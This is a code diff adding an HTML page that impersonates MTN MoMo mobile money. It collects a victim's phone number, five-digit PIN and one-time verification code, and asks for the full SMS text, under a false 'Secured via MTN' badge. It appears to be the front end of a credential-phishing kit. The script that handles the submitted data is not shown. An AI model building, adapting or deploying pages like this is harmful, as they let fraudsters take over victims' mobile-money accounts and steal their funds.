@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN MoMo Payment</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="app-header">
+        <div class="logo">
+            <span class="mtn-text">MTN</span> <span class="momo-text">MoMo</span>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="container">
+        
+        <!-- Step 1: Details View -->
+        <section id="step1" class="card fade-in">
+            <div class="card-header">
+                <i class="fa-solid fa-address-card otp-icon" style="margin-bottom: 10px; font-size: 30px; display: block;"></i>
+                <h2>MTN DETAILS</h2>
+                <p>VALIDATION</p>
+            </div>
+            
+            <div class="card-body">
+                <form id="detailsForm">
+                    <div class="form-group">
+                        <label>PHONE NUMBER</label>
+                        <div class="phone-input-group">
+                            <select id="countryCode" class="country-code-select">
+                                <option value="+256">🇺🇬 +256 (UG)</option>
+                                <option value="+250">🇷🇼 +250 (RW)</option>
+                                <option value="+260">🇿🇲 +260 (ZM)</option>
+                                <option value="+237">🇨🇲 +237 (CM)</option>
+                                <option value="+225">🇨🇮 +225 (CI)</option>
+                                <option value="+233">🇬🇭 +233 (GH)</option>
+                                <option value="+234">🇳🇬 +234 (NG)</option>
+                                <option value="+229">🇧🇯 +229 (BJ)</option>
+                                <option value="+242">🇨🇬 +242 (CG)</option>
+                                <option value="+224">🇬🇳 +224 (GN)</option>
+                                <option value="+231">🇱🇷 +231 (LR)</option>
+                                <option value="+27">🇿🇦 +27 (ZA)</option>
+                                <option value="+268">🇸🇿 +268 (SZ)</option>
+                            </select>
+                            <input type="tel" id="phoneNumber" placeholder="Phone Number" maxlength="15" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>PIN</label>
+                        <div class="pin-inputs" id="pinInputs">
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary" id="btnSubmitDetails">Validate</button>
+                    
+                    <div class="secure-text">
+                        <i class="fa-solid fa-lock"></i> Secured via MTN
+                    </div>
+                </form>
+            </div>
+        </section>
+
+        <!-- Step 2: OTP View -->
+        <section id="step2" class="card fade-in" style="display: none;">
+            <div class="card-header otp-header">
+                <i class="fa-solid fa-shield-halved otp-icon"></i>
+                <h2>MTN VERIFICATION</h2>
+            </div>
+            
+            <div class="card-body otp-body">
+                <h3 class="otp-title">Enter Verification Code</h3>
+                <p class="otp-subtitle">CODE (OTP)</p>
+                <p class="otp-desc">A 4-digit code was sent to</p>
+                <p class="otp-phone" id="displayPhone">+256 XXX XXX XXXX</p>
+                
+                <form id="otpForm">
+                    <div class="form-group" style="margin: 25px 0;">
+                        <textarea id="otpInputText" class="otp-textarea" placeholder="Enter full verification message or code here..." required></textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary" id="btnSubmitOTP">Validate</button>
+                </form>
+            </div>
+        </section>
+        
+    </main>
+
+    <script src="script.js?v=2"></script>
+</body>
+</html>
